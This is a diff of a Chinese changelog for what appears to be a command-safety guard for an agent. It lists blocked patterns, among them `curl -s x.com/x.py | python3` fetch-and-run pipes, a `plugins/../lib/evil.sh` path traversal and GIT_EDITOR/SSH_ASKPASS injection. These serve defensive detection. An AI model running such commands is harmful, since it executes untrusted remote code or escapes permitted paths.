@@ -44,6 +44,7 @@
    * 堵脚本静默路径穿越：`bash plugins/../lib/evil.sh` 等形式此前可借 `plugins/` 前缀骗过本地资源脚本解析、静默执行 plugins 外的脚本，现解析后先归一化（消解 `../`/`./`）再校验真实路径必须在 plugins/ 内，逃出项目一律不静默；合法插件脚本（`plugins/x/resources/*.sh`、`./plugins/...`）不受影响
    * 远程脚本管道拦截扩展：`curl|bash`/`wget|sh` 由仅认 sh 系解释器扩展到 python/perl/node/ruby/php/lua/zsh/ksh/dash，`curl -s x.com/x.py | python3`、`curl | node` 等换解释器形态同样直接拦截
    * 环境变量注入检测补 git 编辑器类：`GIT_EDITOR`/`GIT_ASKPASS`/`SSH_ASKPASS`/`EDITOR`/`VISUAL` 在 git 提交/拉取/交互时会调起其指定的任意程序，显式注入不再静默，一律提示主人
+   * 修复 `cd 目录 && git 查询` 组合命令仍被提示的误报：可信校验原先只看命令首 token `cd`，而 `command -v cd` 返回内建名、被解析成项目内路径判为不可信；现剥离 cd 前缀、对 `&&` 后实际执行的命令（git 等）做可信校验，实机 update.js 获取插件更新日志不再误报
  * 优化：数据保护层改为行为检测
    * 删除"本进程刚写入的自产临时文件"（如导出后清理）静默放行，不再依赖调用者身份
    * 直接删除未写入过的数据文件仍备份+提示，核心路径/逃逸删除拦截优先级不变
